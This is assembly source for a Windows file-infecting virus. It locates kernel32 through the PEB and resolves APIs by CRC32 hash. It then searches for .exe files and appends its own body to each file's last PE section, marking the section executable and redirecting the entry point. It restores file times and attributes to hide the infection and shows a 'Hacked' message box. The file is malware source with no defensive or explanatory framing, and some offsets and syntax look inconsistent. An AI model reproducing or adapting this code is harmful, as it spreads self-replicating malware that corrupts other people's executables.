.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
  szTitle db "Hacked",0
  szMsg db "You've got infected ~", 0
  szUser32 db "user32.dll", 0
  dwSearchHandle dd 0
  szExe db "*.exe", 0
  dwKernelBase dd 0
  dwExportDirectory dd 0
  virSize equ virEnd - virStart

Kernel_APIs struct
    ACloseHandleA dd 4F6CEA0Bh
    ACreateFileAA dd AAC4A387h
    ACreateFileMappingAA dd 4BE46D93h
    AExitProcessA dd DAEF6833h
    AFindFirstFileAA dd 36142A31h
    AFindNextFileAA dd 8AD8D6B7h
    AFlushViewOfFileA dd 68865B91h
    AGetFileAttributesAA dd CF9FE3E3h
    AGetFileTimeA dd C05002B5h
    ALoadLibraryAA dd C03E4272h
    AMapViewOfFileA dd 5764C7D0h
    ASetEndOfFileA dd DAE64EA5h
    ASetFileAttributesAA dd EA9468FDh
    ASetFilePointerA dd 1038158Bh
    ASetFileTimeA dd DE7FB5FCh
    AUnmapViewOfFileA dd C6E54950h
Kernel_APIs ends

User_APIs struct
    AMessageBoxAA dd A8D2A271h
User_APIs ends

.code

virStart:
  pushad
  call CodeStart

CodeStart:
  pop ebp
  sub ebp, CodeStart

  ;;Retrieve the base address of kernel32.dll
  mov ebx, dword ptr fs:[30h]
  mov ebx, [ebx + 0Ch]
  mov ebx, [ebx + 14h]
  mov ebx, [ebx]
  mov ebx, [ebx]
  mov ebx, [ebx + 10h]
  mov eax, dwKernelBase
  add eax, ebp
  mov dword ptr [eax], ebx

  sub esp, 68
  mov ebx, esp
  lea edi, [ebp+Kernel_APIs]
  mov ecx, 16
  mov edx, [ebp+dwKernelBase]
  push ebp
  mov ebp, ebx
  call RetrieveAPIs
  pop ebp
  lea edx, [ebp+szUser32]
  push edx
  call [ebx+36]
  mov edx, eax
  lea edi, [ebp+User_APIs]
  xor ecx, ecx
  inc ecx
  push ebp
  lea ebp, [ebx+64]
  call RetrieveAPIs
  pop ebp


infectFirstFile:
  sub esp, 324
  push esp
  lea edx, [ebp+szExe]
  push edx
  call [ebx+16]
  inc eax
  jz endInfection
  dec eax
  mov dword [esp+320], eax

infectNextFile:
  call infectFile 
  push esp 
  push dword [esp + 324]
  call [ebx+20]
  test eax, eax
  jnz infectNextFile

endInfection:
  add esp, 324

  ;;Main payload
  push 10h 
  lea edx, [ebp + szTitle]
  push edx
  push 0
  call [ebx+64]
  cmp dword [ebp + backToHost + 1], 'inf'
  jne returnToHost
  push 0
  call [ebx+12]

returnToHost: 
  add esp, 68
  popad

backToHost:
  push 'inf'
  retn

;;InfecFile routine

infectFile:
  sub esp,48h
  push ebp
  lea ebp,[esp+4h]  
  mov edx , dword [ebp+34h+WIN32_FIND_DATA.nFileSizeLow]
  mov [ebp+0h] , edx
  mov [ebp+2Ch] , edx
  add dword [ebp+0h] , virSize+1000h    ;fileSize+virSize+extra work space
  lea esi , [ebp+34h+WIN32_FIND_DATA.cFileName]
  push esi
  call [ebx+28h]         ;save original attributes 
  mov [ebp+4h] , eax
  push dword 80h
  push esi
  call [ebx+48h]         ;set to normal , ie clear all attributes
  xor edi,edi
  push edi
  push edi
  push 3
  push edi
  push edi
  push 0C0000000h
  push esi
  call [ebx+4h]
  inc eax
  jz done
  dec eax
  mov dword [ebp+8h] , eax
  lea edx , [ebp+Ch]
  push edx
  add edx,8h
  push edx
  add edx,8h
  push edx
  push eax
  call [ebx+32h]
  push edi
  push dword [ebp+0h]
  push edi
  push 4
  push edi
  push dword [ebp+8h]
  call [ebx+8h]
  mov [ebp+24h] , eax
  push dword [ebp]
  push edi
  push edi
  push 2
  push dword [ebp+24h]
  call [ebx+40h]
  mov esi,eax
  mov edi,eax
  mov [ebp+28h] , eax
  cmp word [esi] , 'MZ'
  jne UnMap
  cmp byte [esi+50h] , 't'    ;already infected ?
  je UnMap
  mov byte [esi+50h] , 't'    ;marked
  add esi , [esi+3Ch]
  cmp word [esi] , 'PE'
  jne UnMap
  mov ecx , esi      ;ecx points to start of pe header
  movzx edx , word [esi+6h]    ;no. of sections
  dec edx
  imul edx , 28h
  add esi , 0F8h
  add esi , edx      ;esi points to header of the last section
  add edi , [esi+14h] 
  add edi , [esi+8h]     ;start copying virus at offset : map + pointerToRawData + virtualSize
  or dword ptr [esi+24h], 20h or 20000000h or 80000000h or 80h  ;set flags (writable , executable , etc)
  add dword [esi+8h] , virSize ;increase virtual size
  mov edx , dword [esi+8h]
  mov dword [ecx+50h] , edx
  mov edx , [esi+Ch]
  add dword [ecx+50h] , edx
  mov eax , dword [ecx+50h]
  xor edx , edx
  div dword [ecx+38h]
  mov eax , [ecx+38h]
  sub eax , edx
  add dword [ecx+50h] , eax   ;new aligned SizeOfImage
  xor edx,edx
  mov eax , dword [esi+8h]
  div dword [ecx+3Ch]
  mov eax , dword [ecx+3Ch]
  sub eax , edx
  push ecx
  mov ecx, dword [esi+8h]
  mov dword [esi+10h] , ecx
  add dword [esi+10h] , eax   ;new aligned SizeOfRawData
  mov ecx , dword [esi+10h]
  mov dword [ebp+2Ch] , ecx    ;save new file size for later call to SetFilePointer
  mov ecx , dword [esi+14h]
  add dword [ebp+2Ch] , ecx
  pop ecx
  mov eax , dword [esi+Ch]
  add eax , dword [esi+8h]
  mov edx , dword [ecx+28h]   ;save OEP
  add edx , dword [ecx+34h]   ;Add Image base to OEP
  sub eax , virSize   
  mov dword [ecx+28h] , eax   ;set new entry point
  mov esi , virStart
  add esi , dword [esp]
  mov ecx , virSize
  cld
  rep movsb         ;copy virus
  sub edi , virSize-(backToHost-virStart)-1
  mov dword [edi] , edx      ;patch OEP

UnMap:
  push dword [ebp+44h]
  push dword [ebp+40h]
  call [ebx+24h]        ;FlushViewOfFile
  push dword [ebp+40h]
  call [ebx+60h]        ;UnMapViewOfFile
  push dword [ebp+36h]
  call [ebx]        ;Close Map Handle
  lea edx , [ebp+12h]
  push edx
  add edx,8h
  push edx
  add edx,8h
  push edx
  push dword [ebp+8h]
  call [ebx+56h]        ;Restore original file time
  push 0
  push 0
  push dword [ebp+44h]
  push dword [ebp+8h]
  call [ebx+52h]        ;SetFilePointer
  push dword [ebp+8h]
  call [ebx+44h]        ;SetEndOfFile
  push dword [ebp+8h]
  call [ebx]        ;Close File Handle
done:
  push dword [ebp+4h]
  lea edx , [ebp+52h+WIN32_FIND_DATA.cFileName]
  push edx
  call [ebx+48h]        ;Restore original attributes
  pop ebp
  add esp,48h
  ret 

RetrieveAPIs:
  push ebx
  push esi

  mov esi, edx
  add esi, [esi+3Ch] ; Start of PE header
  mov esi, [esi+78h] ; RVA of export dir
  add esi, edx     ; VA of export dir
  push esi      ; [esp] = VA of export dir
  mov esi, [esi+20h] ; RVA of ENT
  add esi, edx     ; VA of ENT
  xor ebx,ebx
  cld

  looper:
    inc ebx
    lodsd
    add eax , edx       ;eax now points to the string of a function
    call GenerateCRC       ;eax now holds the hash of our function
    cmp dword [edi] , eax
    jne looper
    mov eax,[esp]
    mov eax,[eax+24h]     ;RVA of EOT
    add eax,edx      ;VA of EOT
    movzx eax , word [(ebx-1)*2+eax]   ;eax now holds the ordinal of our function
    push esi
    mov esi,[esp+4]
    mov esi,[esi+1Ch]     ;RVA of EAT
    add esi,edx      ;VA of EAT
    mov esi,[eax*4+esi]
    add esi,edx
    mov [ebp] , esi     ;save address
    pop esi
    add edi,4
    add ebp,4
    dec ecx
    jnz looper

  pop esi

finished:
  pop esi
  pop ebx
  ret

GenerateCRC:
 
  push ebx                ;ebx is the remainder , ie. the checksum.
  push ecx                ;counter
  or ebx,-1
  byteByByte:
    xor    bl , byte ptr [eax]
    push 8
    pop ecx
    bitByBit:
      shr    ebx,1
      jnc skip
      xor    ebx,0EDB88320h       ;our polynomial
      skip:
      loop bitByBit
    inc eax
    cmp byte ptr [eax],0
    jnz byteByByte
  mov eax,ebx
  pop ecx
  pop ebx
  ret

virEnd:

END